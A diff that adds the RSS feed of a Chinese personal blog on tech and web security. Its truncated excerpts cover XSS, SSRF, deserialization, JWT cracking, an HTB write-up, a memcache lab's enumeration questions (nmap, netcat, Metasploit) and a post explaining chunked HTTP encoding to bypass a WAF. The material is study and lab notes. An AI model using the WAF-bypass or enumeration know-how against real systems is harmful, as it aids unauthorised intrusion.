@@ -1,0 +1,1141 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>喵帕斯</title>
+        <link>https://1dayluo.github.io/</link>
+        <description>遁入迷宫的技术宅的隐秘角落 ｜ 我记录些什么就是为了记录些什么</description>
+        <lastBuildDate>Sun, 14 Jun 2026 16:18:51 GMT</lastBuildDate>
+        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
+        <generator>https://github.com/jpmonette/feed</generator>
+        <image>
+            <title>喵帕斯</title>
+            <url>https://pic.imgdb.cn/item/66a1f641d9c307b7e9291f64.jpg</url>
+            <link>https://1dayluo.github.io/</link>
+        </image>
+        <copyright>CC BY-NC-SA 4.0 2026 © 1dayluo</copyright>
+        <atom:link href="https://1dayluo.github.io/feed.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[playwright环境(centos)]]></title>
+            <link>https://1dayluo.github.io/posts/new/playwright/playwright Centos</link>
+            <guid>https://1dayluo.github.io/posts/new/playwright/playwright Centos</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>playwright环境(centos)</h1>
+<h3>装libstdc/升级gcc</h3>
+<p>参考：<a href="https://stackoverflow.com/questions/70155008/">https://stackoverflow.com/questions/70155008/</a></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[AI Agent安全学习 - agent攻击面学习]]></title>
+            <link>https://1dayluo.github.io/posts/new/ai_agent/agent-security-learn-01-0613</link>
+            <guid>https://1dayluo.github.io/posts/new/ai_agent/agent-security-learn-01-0613</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>过去忙于个人项目（git小号） 许久没有来更这里~ 依旧保持着好奇心和想学习各种知识的心态。<br>
+超级有趣的一年 :) 趣味性大满足，接下来要继续沉下心学习啦</p>
+<h1>A Systematic</h1>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[我的「搞机」日常（破真）  - 开源系统GrapheneOS的推荐]]></title>
+            <link>https://1dayluo.github.io/posts/history/wo-de-gao-ji-ri-chang-po-zhen-kai-yuan-xi-tong-grapheneos-de-tui-jian</link>
+            <guid>https://1dayluo.github.io/posts/history/wo-de-gao-ji-ri-chang-po-zhen-kai-yuan-xi-tong-grapheneos-de-tui-jian</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h2>开端</h2>
+<p>关于我是怎么突然想到需要搞机想法，说（一）来（篇）话（水）长（文）系列（？）</p>
+<p>如果从手机算起的话（<s>不算高中生涯的尝试给自己ipod越狱，最后第二次越狱变砖没敢告诉我爹这件事的话</s></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[我的学习笔记和一些项目&吐槽]]></title>
+            <link>https://1dayluo.github.io/posts/history/wo-de-xue-xi-bi-ji-he-yi-xie-xiang-mu</link>
+            <guid>https://1dayluo.github.io/posts/history/wo-de-xue-xi-bi-ji-he-yi-xie-xiang-mu</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h2>🌸我的Notion笔记 &amp; stars list</h2>
+<p>Burpsuite lab刷题笔记:</p>
+<ul>
+<li>[<a href="https://cubic-brace-c93.notion.site/Learning-Pa">https://cubic-brace-c93.notion.site/Learning-Pa</a></li>
+</ul>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[我好困 11月的水文一份]]></title>
+            <link>https://1dayluo.github.io/posts/history/wo-hao-kun-11-yue-de-shui-wen-yi-fen</link>
+            <guid>https://1dayluo.github.io/posts/history/wo-hao-kun-11-yue-de-shui-wen-yi-fen</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>我好困我好困我好困……生命的意义在于折腾Zzzz<br>
+说起来虽然一直知道：闷声发大财 ，不需要在意别人的看法。<br>
+但是最近才想通，自己确实不需要去迎合别人。 就是，想通后是情绪有转变：不会因为孤独产生一些过</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[线程捕获KeyboardInterrupter]]></title>
+            <link>https://1dayluo.github.io/posts/history/xian-cheng-bu-huo-keyboardinterrupter</link>
+            <guid>https://1dayluo.github.io/posts/history/xian-cheng-bu-huo-keyboardinterrupter</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>线程捕获KeyboardInterrupter不能简单用<code>try....except</code>.......来捕获。原因在stackover上说的很明白：This is a Python bug. W</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[小玩具开发:tg收取mailslurp匿名邮件]]></title>
+            <link>https://1dayluo.github.io/posts/history/xiao-wan-ju-kai-fa-tg-shou-qu-mailslurp-ni-ming-you-jian</link>
+            <guid>https://1dayluo.github.io/posts/history/xiao-wan-ju-kai-fa-tg-shou-qu-mailslurp-ni-ming-you-jian</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h2>写在开头</h2>
+<p>因为日常会经常用到匿名邮箱进行测试/注册一些临时用户, 觉得web页面有点麻烦, 而且批量收发的话,把APT KEY写一起,然后集中管理多个不同帐号下的邮箱会比较方便.于是写了一个基于</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[新主题：Cute-Notes & 简明二次开发指北]]></title>
+            <link>https://1dayluo.github.io/posts/history/xin-zhu-ti-cute-notes-and-jian-ming-er-ci-kai-fa-zhi-bei</link>
+            <guid>https://1dayluo.github.io/posts/history/xin-zhu-ti-cute-notes-and-jian-ming-er-ci-kai-fa-zhi-bei</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>年前就有自定义自己的blog主题的想法，直到tg有人问我当前默认主题我也没有开动，但是提醒了我之前的这个计划……趁着过年补学了nodejs的web framework：express和view eng</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[XSS进阶学习分享（一）]]></title>
+            <link>https://1dayluo.github.io/posts/history/xss-jin-jie-xue-xi-fen-xiang-yi</link>
+            <guid>https://1dayluo.github.io/posts/history/xss-jin-jie-xue-xi-fen-xiang-yi</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p><s>偷悄悄：其实是技术分享用的PPT大纲</s></p>
+<p>后续会在blog继续更一些之前看到的h1的xss构造攻击链为rce的文章（或许）<br>
+更新了文章：<a href="https://1dayluo.github.io/po">https://1dayluo.github.io/po</a></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[XSS水题篇：关于DOM Colbbering一些个人理解]]></title>
+            <link>https://1dayluo.github.io/posts/history/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie</link>
+            <guid>https://1dayluo.github.io/posts/history/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>遇到一个DOM Colbbering题目<br>
+题目</p>
+<pre><code class="language-jsx">function escape(input) {
+    // let's do a post redirection
+    try </code></pre>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[一篇针对工作后的反思（或许)的碎碎念 ]]></title>
+            <link>https://1dayluo.github.io/posts/history/yi-pian-zhen-dui-gong-zuo-hou-de-fan-si-huo-xu-de-sui-sui-nian</link>
+            <guid>https://1dayluo.github.io/posts/history/yi-pian-zhen-dui-gong-zuo-hou-de-fan-si-huo-xu-de-sui-sui-nian</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>大概写一下就继续忙自己的了。因为整理周报和今天下午要干的流程图突然觉得要梳理一下，自勉一下。<br>
+从7月份开始，突然打算在提交工作周报的基础上总结一下周报，确保自己能够确认工作是确实能让自己学到新的</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[《zseano's methodogy》学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/lesslesszseanos-methodogygreatergreater-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/lesslesszseanos-methodogygreatergreater-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>《zseano's methodogy》学习笔记</h1>
+<p>一些图片没有上传,本地和notion好好的,上传上来格式有些emmm(看阅读时间要35min也能够知道完整的文章目前博客显示不完整),完整笔记可</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[理解TLS]]></title>
+            <link>https://1dayluo.github.io/posts/history/li-jie-tls</link>
+            <guid>https://1dayluo.github.io/posts/history/li-jie-tls</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h2>为什么需要TLS</h2>
+<p>前提：每个线程都有TLS<br>
+如果我们要在多线程中对全局变量(<code>Global Variable</code>)进行操作，除了保护多个线程对该变量内存读写不会有影响（加锁)，同时也要</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Linux篇:配置你的aria2 - (网盘下载 代替迅雷)]]></title>
+            <link>https://1dayluo.github.io/posts/history/linux-pian-pei-zhi-ni-de-aria2-wang-pan-xia-zai-dai-ti-xun-lei</link>
+            <guid>https://1dayluo.github.io/posts/history/linux-pian-pei-zhi-ni-de-aria2-wang-pan-xia-zai-dai-ti-xun-lei</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>无聊水篇oao<br>
+昨天用windows配了下aria2下载某度云盘是真的香...打算给自己的arch linux也配一套下载, windows网上有傻瓜包就不复述了.这里讲我在linux下配置的过程,</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Linux篇:配置你的aria2]]></title>
+            <link>https://1dayluo.github.io/posts/history/linux-pian-pei-zhi-ni-de-aria2</link>
+            <guid>https://1dayluo.github.io/posts/history/linux-pian-pei-zhi-ni-de-aria2</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>无聊水篇oao<br>
+昨天用windows配了下aria2下载某度云盘是真的香...打算给自己的arch linux也配一套下载, windows网上有傻瓜包就不复述了.这里讲我在linux下配置的过程,先</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[PHP反序列化笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/php-fan-xu-lie-hua-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/php-fan-xu-lie-hua-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>反序列化</h1>
+<p>概念整理搬运工，都是看各类网上文章整理好久+自己的学习理解才发布的博文ovo 参考见文末，如果有落下欢迎指正。更新最新版见在个人notion，~~不懒的话有更新会及时同步到blog的2</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[氵：openvpn连接htb报错修复：verfiy error]]></title>
+            <link>https://1dayluo.github.io/posts/history/san-openvpn-lian-jie-htb-bao-cuo-xiu-fu-verfiy-error</link>
+            <guid>https://1dayluo.github.io/posts/history/san-openvpn-lian-jie-htb-bao-cuo-xiu-fu-verfiy-error</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p><s>非常的氵</s><br>
+之前链接一直很成功，在一次pacman -Syu的滚动更新后，发现链接htb的时候一直在报错：</p>
+<pre><code>VERIFY ERROR: depth=0, error=CA signat</code></pre>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[sddm & i3 美化 & 杂谈]]></title>
+            <link>https://1dayluo.github.io/posts/history/sddm-and-i3-mei-hua-and-za-tan</link>
+            <guid>https://1dayluo.github.io/posts/history/sddm-and-i3-mei-hua-and-za-tan</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h2>关于sddm</h2>
+<h3>sddm主题</h3>
+<ol>
+<li>去arch aur官网，搜索sddm-theme即可，然后列出来的可以去github（<br>
+Git Clone URL什么的）看一下样式。</li>
+</ol>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[深入浅出SSRF（一） ： 我的学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/shen-ru-qian-chu-ssrf-wo-de-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/shen-ru-qian-chu-ssrf-wo-de-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>SSRF(Server-Side Request Forgery)</h1>
+<aside>
+💡 Make sure the request comes from the remote server a]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[深入浅出SSRF（二）：我的学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/shen-ru-qian-chu-ssrfer-wo-de-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/shen-ru-qian-chu-ssrfer-wo-de-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>困困更blog……<br>
+之前拿着本来要发blog的文章去“换”了一个会员...其实我不太喜欢闭源小圈子分享（虽然能换积分/社区认同），我还是喜欢自己博客发，要么不发....小透明的坚持，等找工作/需要交</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[使用celery让任务在后台运行（失败，celery不支持windows)]]></title>
+            <link>https://1dayluo.github.io/posts/history/shi-yong-celery-rang-ren-wu-zai-hou-tai-yun-xing-wei-wan</link>
+            <guid>https://1dayluo.github.io/posts/history/shi-yong-celery-rang-ren-wu-zai-hou-tai-yun-xing-wei-wan</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>什么是celery</h1>
+<pre><code> Celery 是一个异步任务队列。你可以使用它在你的应用上下文之外执行任务。总的想法就是你的应用程序可能需要执行任何消耗资源的任务都可以交给任务队列，让你的应用程序
+</code></pre>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[刷题]水题-memcache安全相关]]></title>
+            <link>https://1dayluo.github.io/posts/history/shua-ti-shui-ti-memcache-an-quan-xiang-guan</link>
+            <guid>https://1dayluo.github.io/posts/history/shua-ti-shui-ti-memcache-an-quan-xiang-guan</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p><strong>写在开头：</strong></p>
+<p>忙里偷闲刷的题，所以中间有重启lab导致ip变更的情况。</p>
+<h2>Questions</h2>
+<ol>
+<li>Find the version of memcached server using nmap.</li>
+<li>Find the version information using netcat or telnet.</li>
+<li>Find the maximum number of simultaneous incoming connections allowed by the memcached server use available nmap scripts.</li>
+<li>Find the number of current items on the memcached server using memcstat.</li>
+<li>Find the value stored in the key 'flag' from the key value pairs dumped by available Metasploit module.</li>
+<li>Find the name of all keys present on the memcached server using memcdump.</li>
+<li>Find the value stored in key “first_name” using memcached-tool.</li>
+</ol>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[spring 基础概念笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/spring-ji-chu-gai-nian-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/spring-ji-chu-gai-nian-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>基于廖雪峰老师网站所做的java学习笔记。为了快速审计java代码，而非开发~</p>
+<h2>IOC</h2>
+<p><strong>Ioc容器</strong>，负责把一些service和datasource包装起来，并且管理创建和销毁</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Symfony RCE 分析]]></title>
+            <link>https://1dayluo.github.io/posts/history/synfony-rce-fen-xi</link>
+            <guid>https://1dayluo.github.io/posts/history/synfony-rce-fen-xi</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>笔记与总结，笔记/参考见文末。阅读exp代码的心得忽略。</p>
+<h2>概括</h2>
+<p>Symfony framwork为一个PHP application，并且用于许多知名CMS中，包括Drupal，Joomla</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[推荐一下自己开发的论坛:蛋憨]]></title>
+            <link>https://1dayluo.github.io/posts/history/tui-jian-yi-xia-zi-ji-kai-fa-de-lun-tan-dan-han</link>
+            <guid>https://1dayluo.github.io/posts/history/tui-jian-yi-xia-zi-ji-kai-fa-de-lun-tan-dan-han</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>名字的起因是本想给男朋友搭建一个共同的情侣空间.但是后面随着开发,变成了论坛(吐舌)</p>
+<p>这个项目断断续续的,今年年末的时候不知道为啥突然拾起了这个年初挖的坑,继续给todo增添了几笔.甚至觉得明年,或者后年,我可以开发更多有趣的东西,比如一直想做的:做一款自己的游戏,上架steam</p>
+<p>目前还是半完成品,部署在heroku上的可能会有一些显示错误</p>
+<p>项目地址: <a href="https://github.com/1dayluo/flasklearn-secretsapce">https://github.com/1dayluo/flasklearn-secretsapce</a></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Vue学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/vue-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/vue-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>通过一天时间了解了一下vue，把一些对于新人来说比较混淆/不清楚的概念总结了一下</p>
+<h1>Vue基本组件学习记录</h1>
+<h2>简单组件sample</h2>
+<p><img src="https://i.loli.net/2020/12/03/LbFE5mSApPRhJXe.png" alt="Image"></p>
+<h2>局部注册</h2>
+<p><img src="https://i.loli.net/2020/12/03/vbGenP2js36Mo7V.png" alt="Image"></p>
+<h1>基础指令</h1>
+<h2>v-bind</h2>
+<p>v-bind解释</p>
+<p><img src="https://i.loli.net/2020/12/03/EYJrAj9caf1i6N3.png" alt="Image"></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[wafbypass]使用python发送chunked]]></title>
+            <link>https://1dayluo.github.io/posts/history/wafbypassshi-yong-python-fa-song-chunked</link>
+            <guid>https://1dayluo.github.io/posts/history/wafbypassshi-yong-python-fa-song-chunked</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>遇到云盾，网上查询bypass方法一有利用http协议中，使用chunked编码分块发送HTTP消息。既然以后会用到就干脆写一个发送工具好啦（仅供参考）<br>
+我也不知道自己写的对不对_(:3_|/_)独自摸索x</p>
+<blockquote>
+<p>参考：</p>
+<ul>
+<li><a href="https://stackoverflow.com/questions/24500752/how-can-i-read-exactly-one-response-chunk-with-pythons-http-client">https://stackoverflow.com/questions/24500752/how-can-i-read-exactly-one-response-chunk-with-pythons-http-client</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1606911">https://cloud.tencent.com/developer/article/1606911</a></li>
+</ul>
+</blockquote>
+<p>chunked编码格式如下</p>
+<p><strong>格式：</strong></p>
+<ul>
+<li>
+<p>如果一个HTTP消息（请求消息或应答消息）的Transfer-Encoding消息头的值为chunked，那么，消息体由数量未定的块组成，并以最后一个大小为0的块为结束。</p>
+</li>
+<li>
+<p>每一个非空的块都以该块包含数据的字节数（字节数以十六进制表示）开始，跟随一个CRLF （回车及换行），然后是数据本身，最后块CRLF结束。在一些实现中，块大小和CRLF之间填充有白空格（0x20）。</p>
+</li>
+<li>
+<p>最后一块是单行，由块大小（0），一些可选的填充白空格，以及CRLF。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。消息最后以CRLF结尾。</p>
+</li>
+</ul>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[HTB:Vessel]]></title>
+            <link>https://1dayluo.github.io/posts/history/htbvessel</link>
+            <guid>https://1dayluo.github.io/posts/history/htbvessel</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>HTB：Vessel</h1>
+<p>关键词： .git,git information leak,express mis-handles,owa 1.7.3, CVE-2022-24637,PyInstall</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[java RMI（Remote Method Invocation）]]></title>
+            <link>https://1dayluo.github.io/posts/history/java-rmiremote-method-invocation</link>
+            <guid>https://1dayluo.github.io/posts/history/java-rmiremote-method-invocation</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>笔记来源：</p>
+<ul>
+<li>[<a href="https://is4b3lla3.github.io/2020/06/27/Java">https://is4b3lla3.github.io/2020/06/27/Java</a> RMI学习/#远程方法调用](<a href="https://is4b3lla3.github.io/2">https://is4b3lla3.github.io/2</a></li>
+</ul>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Java学习笔记: Servlet]]></title>
+            <link>https://1dayluo.github.io/posts/history/java-xue-xi-bi-ji-servlet</link>
+            <guid>https://1dayluo.github.io/posts/history/java-xue-xi-bi-ji-servlet</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>重新捡起java诶~</p>
+<h2>基础概念</h2>
+<h3>J2EE &amp; JAVA EE &amp; jakarta EE</h3>
+<p>在此之前要知道 ：</p>
+<blockquote>
+<p>Ever heard of Java EE? How abou</p>
+</blockquote>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Javascript Prototype Pollution 学习笔记]]></title>
+            <link>https://1dayluo.github.io/posts/history/javascript-prototype-pollution-xue-xi-bi-ji</link>
+            <guid>https://1dayluo.github.io/posts/history/javascript-prototype-pollution-xue-xi-bi-ji</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>笔记中英文混杂,问就是懒得翻译.学习笔记都是二次吸收,原始文章见Resource&amp;Reference处. 笔记只是留给自己学习反复查阅和理解的......尽可能写的对自己来说全面一些.</p>
+<p>~~其实学了</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[对于Flask的个人理解及安全相关]]></title>
+            <link>https://1dayluo.github.io/posts/history/ji-zhu-fen-xiang-hui-wo-dui-yu-flask-jin-qi-li-jie-de-yi-ge-gao-zi</link>
+            <guid>https://1dayluo.github.io/posts/history/ji-zhu-fen-xiang-hui-wo-dui-yu-flask-jin-qi-li-jie-de-yi-ge-gao-zi</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<blockquote>
+<p>这是一个应付技术分享会的文稿<br>
+写在开头：<br>
+技术分享会写的稿子，文字写的很认真。PPT就。。。应付吧，计划用reveal-md生成PPT （反正第一天感觉好多都好水)  据我认真观察，讲</p>
+</blockquote>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[技术阅读]双查询原理]]></title>
+            <link>https://1dayluo.github.io/posts/history/ji-zhu-yue-du-shuang-cha-xun-yuan-li</link>
+            <guid>https://1dayluo.github.io/posts/history/ji-zhu-yue-du-shuang-cha-xun-yuan-li</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>Double_ SQL_Injection/#0x01-双查询</h1>
+<p>原文链接：[Double SQL Injection(双查询注入) | Mochazz's blog](<a href="https://moc">https://moc</a></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[技术阅读]web缓存投毒]]></title>
+            <link>https://1dayluo.github.io/posts/history/ji-zhu-yue-du-web-huan-cun-tou-du</link>
+            <guid>https://1dayluo.github.io/posts/history/ji-zhu-yue-du-web-huan-cun-tou-du</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[技术阅读]用github来实现漏洞赏金猎人]]></title>
+            <link>https://1dayluo.github.io/posts/history/ji-zhu-yue-du-yong-github-lai-shi-xian-lou-dong-shang-jin-xi-ren</link>
+            <guid>https://1dayluo.github.io/posts/history/ji-zhu-yue-du-yong-github-lai-shi-xian-lou-dong-shang-jin-xi-ren</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h1>GitHub for Bug Bounty Hunters-edoverflow</h1>
+<p>原文链接：[GitHub for Bug Bounty Hunters](<a href="https://edoverflo">https://edoverflo</a></p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[JWT Crack总结 （一）]]></title>
+            <link>https://1dayluo.github.io/posts/history/jwt-crack-zong-jie</link>
+            <guid>https://1dayluo.github.io/posts/history/jwt-crack-zong-jie</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<h2>场景总结</h2>
+<p>首先要明白，一个jwt是由三部分组成的：header，payload，signature。三个部分用 <code>.</code> 连接，用base64编码且格式要求去掉末尾的 <code>=</code></p>
+<p>其他额外需要知</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[Length Extension Attack]]></title>
+            <link>https://1dayluo.github.io/posts/history/length-extension-attack</link>
+            <guid>https://1dayluo.github.io/posts/history/length-extension-attack</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>关键词:MD5, SHA-1,Length Extension Attack</p>
+<h2>Outline</h2>
+<p>网站通常会hash对应的secret以防止被篡改。而Length extension atta</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[初九 潜龙勿用：自学安全小白的2022年总结  ]]></title>
+            <link>https://1dayluo.github.io/posts/history/2022-nian-zong-jie</link>
+            <guid>https://1dayluo.github.io/posts/history/2022-nian-zong-jie</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>很遗憾的在开头说，过去一年里，我的重心并不在于「产出」，而是在于 积累和学习。因为我觉得我现在并不到产出的过程（虽然也有少数几个部分）。思来想去还是写一篇吧，毕竟也有很多人像我一样，从外行的noob开</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[20220714 回头看,往前走]]></title>
+            <link>https://1dayluo.github.io/posts/history/20220714-hui-tou-kan-wang-qian-zou</link>
+            <guid>https://1dayluo.github.io/posts/history/20220714-hui-tou-kan-wang-qian-zou</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>最近思考自己的长期目标,发现最初定下目标的时候目标的框架是模糊的,随着你越走越深,发现自己的失败.主要是由于你在定目标时对目标的不够了解,你以为过程是A到D,D到F,实际上发现A到D之间还有BC,AB</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[AWS 常见安全问题总结（一）]]></title>
+            <link>https://1dayluo.github.io/posts/history/aws-chang-jian-an-quan-wen-ti-zong-jie-yi</link>
+            <guid>https://1dayluo.github.io/posts/history/aws-chang-jian-an-quan-wen-ti-zong-jie-yi</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
